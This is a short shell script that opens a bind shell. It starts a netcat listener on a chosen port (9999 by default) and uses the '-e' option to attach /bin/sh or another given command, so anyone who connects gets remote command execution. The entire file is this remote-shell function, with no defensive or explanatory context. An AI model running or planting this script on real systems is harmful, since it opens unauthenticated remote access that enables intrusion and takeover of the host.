#!/bin/sh

port=9999
cmd=/bin/sh

if [[ $# = 1 ]]; then
		port=$1
elif [[ $# = 2 ]]; then
		port=$1
		cmd=$2
fi;

nc -l -p $port -e $cmd
